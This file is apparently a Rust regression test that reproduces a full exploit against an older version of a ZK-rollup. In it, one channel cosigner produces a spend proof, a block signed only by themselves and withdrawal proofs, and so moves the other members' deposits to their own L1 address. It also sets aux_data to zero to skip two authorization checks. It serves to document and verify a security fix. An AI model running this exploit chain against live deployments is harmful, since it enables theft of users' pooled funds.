//! PHASE 5 — the PRE-CHANGE regression witness (`doc/tasks/small-block-nofn-design.md` §2.1, §9).
//!
//! THIS FILE DOES NOT COMPILE AT `feat/falcon-poseidon-sig` HEAD AND IS NOT MEANT TO.
//! It is kept under `doc/tasks/` (outside every Cargo target directory) because the claim it
//! establishes — "the §2.1 attack really did work" — can only ever be re-established against the
//! code that had the hole, and a claim nobody can re-run is a claim nobody can check.
//!
//! Reproduce:
//!
//! ```sh
//! git worktree add /tmp/nofn-pre c2b69fb          # the last commit before Phase 3
//! ln -s "$PWD/contracts/lib/polygon-plonky2" \
//!       /tmp/nofn-pre/contracts/lib/polygon-plonky2   # same pinned submodule, not re-fetched
//! cp doc/tasks/small-block-nofn-phase5-pre-change-attack.rs \
//!    /tmp/nofn-pre/tests/nofn_pre_change_attack.rs
//! cd /tmp/nofn-pre && cargo test --release --test nofn_pre_change_attack -- --nocapture
//! ```
//!
//! `c2b69fb` is chosen deliberately: Phase 3 (`2459aa6`) is where the N-of-N binding landed in
//! `update_channel_tree`, so `c2b69fb` is the newest commit that still enforces the OLD rule —
//! "some key registered in this channel's genesis member tree signed this `tx_tree_root`" (§1).
//! Phases 1-2 (`9c02a2e`, `061a8c5`, `c2b69fb` itself) are included, so nothing about the attack
//! is attributable to them being absent. This is the REAL old code path, not a reconstruction of
//! it.
//!
//! WHAT THIS TEST IS. Not a unit test of a constraint: the whole §2.1 chain, end to end, with real
//! proofs at every link — spend -> send-tx -> block -> validity -> withdrawal. A single registered
//! cosigner, holding nothing but their own Falcon key and the channel's `prev_private_state`,
//! moves the channel's entire balance to an L1 address they control. Every other member is absent
//! from the construction; none of them is asked for anything.
//!
//! If this test ever fails to complete the theft, the Phase 5 conclusion is NOT "the fix works" —
//! it is "the threat model in §2 is wrong and the whole change must be re-derived" (§9 Phase 5,
//! step 2). Do not adjust the attack until it passes.
#![cfg(not(debug_assertions))]

use intmax3_zkp::{
    circuits::{
        balance::{
            balance_processor::BalanceProcessor,
            common::recipient::{
                calculate_recipient_from_address, calculate_recipient_from_user_id,
            },
            spend_circuit::SpendCircuit,
        },
        test_utils::{
            balance_witness_generator::{
                BalanceWitnessGenerator, ReceiveDepositData, SendTxData, SingleWithdrawalData,
            },
            block_witness_generator::{
                BlockTxV2Witness, BlockWitnessGenerator, BlockWitnessGeneratorHandle,
            },
        },
        validity::block_hash_chain::{
            block_hash_chain_processor::BlockHashChainProcessor, validity_circuit::ValidityCircuit,
        },
        withdraw::{
            single_withdrawal_circuit::{
                SINGLE_WITHDRAWAL_PUBLIC_INPUTS_LEN, SingleWithdawalCircuit,
                SingleWithdawalPublicInputs,
            },
            withdrawal_processor::WithdrawalProcessor,
            withdrawal_step::WithdrawalStepWitness,
        },
    },
    common::{
        channel_id::ChannelId,
        salt::Salt,
        transfer::Transfer,
        trees::{transfer_tree::TransferTree, tx_tree::TxTree, tx_v2_tree::TxV2Tree},
        tx::{Tx, TxClass, TxV2},
        u63::BlockNumber,
    },
    ethereum_types::{
        address::Address, bytes32::Bytes32, u32limb_trait::U32LimbTrait as _, u256::U256,
    },
    utils::{conversion::ToU64 as _, poseidon_hash_out::PoseidonHashOut},
};
use plonky2::{field::goldilocks_field::GoldilocksField, plonk::config::PoseidonGoldilocksConfig};
use rand::{SeedableRng, rngs::StdRng};
use std::time::Instant;

const D: usize = 2;
type F = GoldilocksField;
type C = PoseidonGoldilocksConfig;

/// The channel under attack. Registered with three cosigners; the attacker is slot 0.
const CHANNEL: u32 = 1;
/// What member 1 put into the channel.
const MEMBER1_FUNDS: u32 = 6;
/// What member 2 put into the channel.
const MEMBER2_FUNDS: u32 = 4;
/// What the attacker (slot 0) put in: nothing. The theft is the full pool.
const THEFT: u32 = MEMBER1_FUNDS + MEMBER2_FUNDS;

#[cfg_attr(debug_assertions, ignore = "run with --release")]
#[test]
fn one_cosigner_drains_the_channel_on_the_pre_change_path() {
    let t0 = Instant::now();
    let supported_user_counts = vec![2];

    let block_hash_chain_processor =
        BlockHashChainProcessor::<F, C, D>::new(&supported_user_counts);
    let block_chain_vd = block_hash_chain_processor.block_chain_vd();
    let spend_circuit = SpendCircuit::<F, C, D>::new();
    let balance_processor = BalanceProcessor::<F, C, D>::new(&spend_circuit.data.verifier_data());
    let balance_vd = balance_processor.balance_vd();
    let bwgen = BlockWitnessGeneratorHandle::new(BlockWitnessGenerator::new(&supported_user_counts));

    let mut rng = StdRng::seed_from_u64(0x2_1_A7_7A);
    let channel_id = ChannelId::new(CHANNEL as u64).expect("channel id");
    let salt = Salt::rand(&mut rng);

    // The base-layer account of a channel IS the channel (`ChannelId` is the account index), and
    // its `FullPrivateState` is the `prev_private_state` §2.1 says EVERY cosigner holds. The
    // attacker is therefore modelled exactly: one participant, in possession of this state and of
    // their own Falcon key, and of nothing else.
    let mut attacker_state = BalanceWitnessGenerator::new(
        channel_id,
        salt,
        bwgen.clone(),
        &balance_processor,
    )
    .expect("attacker's copy of the channel's private state");

    let initial_ext_state = bwgen.borrow().current_extended_public_state();

    // ---- Block 1: registration. THREE cosigners; the attacker is slot 0 and holds only key 0. --
    {
        let mut g = bwgen.borrow_mut();
        g.add_channel_registration(CHANNEL);
        g.add_registration_block(0).expect("registration block");
    }
    let registered_members = bwgen
        .borrow()
        .channel_members
        .get(&channel_id)
        .expect("the channel is registered")
        .falcon_keys
        .len();
    assert_eq!(
        registered_members, 3,
        "the attack is only interesting against a channel with other members to rob"
    );

    // ---- Block 2: the OTHER TWO members fund the channel. The attacker funds nothing. ----------
    let member1_l1 = Address::from_u32_slice(&[0x1111_1111; 5]).expect("member 1 L1 address");
    let member2_l1 = Address::from_u32_slice(&[0x2222_2222; 5]).expect("member 2 L1 address");
    let salt1 = Salt::rand(&mut rng);
    let salt2 = Salt::rand(&mut rng);
    let recipient1 = calculate_recipient_from_user_id(channel_id, salt1);
    let recipient2 = calculate_recipient_from_user_id(channel_id, salt2);
    {
        let mut g = bwgen.borrow_mut();
        g.add_deposit(
            member1_l1,
            recipient1,
            0,
            U256::from(MEMBER1_FUNDS),
            Bytes32::default(),
        )
        .expect("member 1 deposit");
        g.add_deposit(
            member2_l1,
            recipient2,
            0,
            U256::from(MEMBER2_FUNDS),
            Bytes32::default(),
        )
        .expect("member 2 deposit");
        g.add_block(0, &[], 0, Bytes32::default())
            .expect("deposit block");
    }
    for (receiver, deposit_salt) in [(recipient1, salt1), (recipient2, salt2)] {
        let witness = attacker_state
            .receive_deposit_witness(&ReceiveDepositData {
                receiver,
                deposit_salt,
            })
            .expect("receive deposit witness");
        let proof = balance_processor
            .prove_receive_deposit(&witness)
            .expect("deposit proof");
        attacker_state
            .commit_receive_deposit(&proof, &witness)
            .expect("commit deposit");
    }

    // ---- §2.1 STEP 1: a spend proof draining the channel. "What blocks it: nothing." -----------
    //
    // `SpendWitness` is `{tx_nonce, prev_private_state, transfers, before_balances,
    // asset_merkle_proofs, sent_tx_merkle_proof}` — no key target and no signature target
    // (spend_circuit.rs:111-119). The only economic constraint is `prev_balance >= amount` per
    // asset leaf, and the attacker chooses the leaves. So a member who holds the private state can
    // spend the WHOLE pool, not merely their own share.
    let attacker_l1 = Address::from_u32_slice(&[0xdead_beef; 5]).expect("attacker L1 address");
    let theft = Transfer {
        recipient: calculate_recipient_from_address(attacker_l1),
        token_index: 0,
        amount: U256::from(THEFT),
        // SECURITY (§2.1, "two would-be second factors do not fire"): `aux_data = 0` is the single
        // knob that disarms BOTH of them — the IMPW authorization gate at IntmaxRollup.sol:1512
        // only fires when `auxData != 0`, and `send_tx_circuit.rs:293` folds nothing into
        // `settled_tx_chain` when it is zero, so the close-time chain equality never sees the
        // theft either. It is set to zero here for exactly that reason.
        aux_data: Bytes32::default(),
    };
    let spend_witness = attacker_state
        .spend_witness(&[theft.clone()])
        .expect("spend witness");
    let t = Instant::now();
    let spend_proof = spend_circuit
        .prove(&spend_witness)
        .expect("STEP 1 must succeed: the spend circuit has no signature to check");
    println!("[pre-change] step 1 spend proof: {:?}", t.elapsed());

    // ---- §2.1 STEP 3 (block side): the attacker's own small block over the theft root. ---------
    let mut transfer_tree = TransferTree::init();
    transfer_tree.push(theft.clone());
    let transfer_index = 0u32;
    let transfer_merkle_proof = transfer_tree.prove(transfer_index as u64);
    let transfer_tree_root = transfer_tree.get_root();

    let tx = Tx {
        transfer_tree_root,
        nonce: attacker_state.full_private_state.nonce,
    };
    let mut tx_tree = TxTree::init();
    tx_tree.update(channel_id.as_u64(), tx.clone());
    let tx_merkle_proof = tx_tree.prove(channel_id.as_u64());

    let tx_v2 = TxV2 {
        tx_class: TxClass::UserTransfer,
        transfer_tree_root,
        nonce: tx.nonce,
        channel_action_root: PoseidonHashOut::default(),
    };
    let mut tx_v2_tree = TxV2Tree::init();
    tx_v2_tree.update(channel_id.as_u64(), tx_v2);
    let theft_tx_tree_root: Bytes32 = tx_v2_tree.get_root().into();
    let tx_v2_merkle_proof = tx_v2_tree.prove(channel_id.as_u64());

    {
        let mut g = bwgen.borrow_mut();
        // The generator signs this block with the block-producer slot's key and NOTHING ELSE —
        // one IMSB Falcon signature by slot 0, `bp_member_slot = 0`, `bp_pk_g = slot 0's`
        // (block_witness_generator.rs, `add_block_with_tx_v2`). That is not a concession made for
        // the test: it is what the pre-change protocol required of a signing block, and it is
        // precisely §2.1 step 3. The attacker is the only signer.
        g.add_block_with_tx_v2(
            CHANNEL,
            &[1],
            1,
            theft_tx_tree_root,
            Some(BlockTxV2Witness {
                tx_v2_indices: vec![channel_id.as_u64(), 0],
                tx_v2s: vec![tx_v2, TxV2::default()],
                tx_v2_merkle_proofs: vec![
                    tx_v2_merkle_proof.clone(),
                    tx_v2_merkle_proof.clone(),
                ],
            }),
        )
        .expect("the theft block");
    }
    assert_eq!(
        bwgen.borrow().bp_sig_events.len(),
        1,
        "exactly ONE signature backs this block — that is the defect being witnessed"
    );

    // ---- §2.1 STEP 2: wrap the spend in a send-tx proof. "What blocks it: nothing." ------------
    let send_tx_data = SendTxData {
        spend_proof: spend_proof.clone(),
        tx_tree_root: theft_tx_tree_root,
        tx: tx.clone(),
        tx_merkle_proof: tx_merkle_proof.clone(),
        tx_v2: Some(tx_v2),
        tx_v2_merkle_proof: Some(tx_v2_merkle_proof.clone()),
        transfer: theft.clone(),
        transfer_merkle_proof: transfer_merkle_proof.clone(),
    };
    let send_tx_witness = attacker_state
        .send_tx_witness(&send_tx_data)
        .expect("send tx witness");
    let t = Instant::now();
    let balance_proof = balance_processor
        .prove_send_tx(&send_tx_witness)
        .expect("STEP 2 must succeed: no member signature is referenced");
    println!("[pre-change] step 2 send-tx proof: {:?}", t.elapsed());
    attacker_state
        .commit_send_tx(&balance_proof, &send_tx_witness, &spend_witness)
        .expect("commit send tx");

    // ---- §2.1 STEP 3 (validity side): the 1-of-N block is ACCEPTED by the validity proof. ------
    let mut prev_block_proof = None;
    let mut last_block_proof = None;
    {
        let g = bwgen.borrow();
        for idx in 1..=g.block_number.as_u64() {
            let bn = BlockNumber::new(idx).expect("block number");
            let witness = g.block_chain_witness.get(&bn).cloned().expect("witness");
            let init = if prev_block_proof.is_none() {
                Some(initial_ext_state.clone())
            } else {
                None
            };
            let proof = block_hash_chain_processor
                .prove_block(init, prev_block_proof.clone(), &witness)
                .expect("STEP 3 must succeed: one registered key's signature is all the old rule asks for");
            prev_block_proof = Some(proof.clone());
            last_block_proof = Some(proof);
        }
    }
    let final_block_chain_proof = last_block_proof.expect("final block chain proof");

    let list_circuit = intmax3_zkp::falcon_sig::list::ListCircuit::<F, C, D>::new();
    let list_proof = bwgen
        .borrow()
        .build_bp_sig_list_proof(&list_circuit)
        .expect("the single-signature list proof");
    assert!(
        list_proof.is_some(),
        "the span signed, so a list proof must exist"
    );
    let validity_circuit =
        ValidityCircuit::<F, C, D>::new(&block_chain_vd, &list_circuit.verifier_data());
    let t = Instant::now();
    let validity_proof = validity_circuit
        .prove(&final_block_chain_proof, list_proof.as_ref(), attacker_l1)
        .expect("STEP 3: the validity proof must ACCEPT a block signed by one cosigner");
    validity_circuit
        .verify(&validity_proof)
        .expect("STEP 3: and it must verify");
    println!("[pre-change] step 3 validity proof: {:?}", t.elapsed());

    // ---- §2.1 STEPS 4-5: withdraw. The theft leaves the rollup. --------------------------------
    let single_withdrawal_circuit = SingleWithdawalCircuit::<F, C, D>::new(&balance_vd);
    let single_withdrawal_vd = single_withdrawal_circuit.data.verifier_data();
    let single_withdrawal_witness = attacker_state
        .single_withdrawal_witness(&SingleWithdrawalData {
            tx_tree_root: theft_tx_tree_root,
            tx: tx.clone(),
            tx_merkle_proof: tx_merkle_proof.clone(),
            transfer: theft.clone(),
            transfer_index,
            transfer_merkle_proof: transfer_merkle_proof.clone(),
            tx_v2: Some(tx_v2),
            tx_v2_merkle_proof: Some(tx_v2_merkle_proof.clone()),
        })
        .expect("single withdrawal witness");
    let t = Instant::now();
    let single_withdrawal_proof = single_withdrawal_circuit
        .prove(&single_withdrawal_witness)
        .expect("STEP 4 must succeed: the tx is under the settled block's tx_tree_root");
    single_withdrawal_circuit
        .data
        .verify(single_withdrawal_proof.clone())
        .expect("STEP 4: verify");
    println!("[pre-change] step 4 single withdrawal: {:?}", t.elapsed());

    let withdrawal_processor = WithdrawalProcessor::<F, C, D>::new(&single_withdrawal_vd);
    let withdrawal_chain_proof = withdrawal_processor
        .prove_step(&WithdrawalStepWitness::<F, C, D> {
            prev_withdrawal_chain_proof: None,
            single_withdrawal_proof: single_withdrawal_proof.clone(),
            update_public_state: single_withdrawal_witness.update_public_state.clone(),
        })
        .expect("withdrawal chain proof");
    let ext_public_state = bwgen.borrow().current_extended_public_state();
    let withdrawal_proof = withdrawal_processor
        .prove_final(&withdrawal_chain_proof, attacker_l1, &ext_public_state)
        .expect("STEP 5 must succeed: the aggregated withdrawal proof");
    withdrawal_processor
        .withdrawal_vd()
        .verify(withdrawal_proof)
        .expect("STEP 5: verify");

    // ---- What actually moved, and to whom. -----------------------------------------------------
    let withdrawal = SingleWithdawalPublicInputs::from_u64_slice(
        &single_withdrawal_proof.public_inputs[..SINGLE_WITHDRAWAL_PUBLIC_INPUTS_LEN].to_u64_vec(),
    )
    .expect("parse the withdrawal the proof authorizes")
    .withdrawal;
    assert_eq!(
        withdrawal.recipient, attacker_l1,
        "the proof must pay the ATTACKER — otherwise this is not the §2.1 attack"
    );
    assert_eq!(
        withdrawal.amount,
        U256::from(THEFT),
        "the whole pool, including both other members' deposits"
    );
    assert_eq!(
        withdrawal.aux_data,
        Bytes32::default(),
        "aux_data = 0: the IntmaxRollup IMPW gate is skipped and settled_tx_chain is untouched"
    );

    println!(
        "[pre-change] ATTACK SUCCEEDED in {:?}: cosigner slot 0 moved {} (member1 {} + member2 {}) \
         to {} with ONE self-produced signature and zero involvement from the other two members.",
        t0.elapsed(),
        THEFT,
        MEMBER1_FUNDS,
        MEMBER2_FUNDS,
        attacker_l1.to_hex(),
    );
}
